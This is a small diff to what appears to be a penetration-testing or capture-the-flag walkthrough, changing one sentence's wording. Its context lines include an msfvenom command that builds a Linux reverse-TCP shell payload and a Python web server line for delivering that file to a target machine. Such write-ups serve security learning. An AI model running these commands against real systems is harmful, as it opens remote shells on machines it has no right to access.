@@ -865,7 +865,7 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=LOCAL_IP LPORT=LOCAL_PORT -f elf -
 
 ![image](https://user-images.githubusercontent.com/14150485/172459683-553b1f6b-cfe8-48d5-9db6-e60f546338e6.png)
 
-Now let's set up a temporary python server so we can download the file on the target machine:
+Now let's set up a temporary python server so we can download the file from the target machine:
 
 ```
 python3 -m http.server LOCAL_PORT
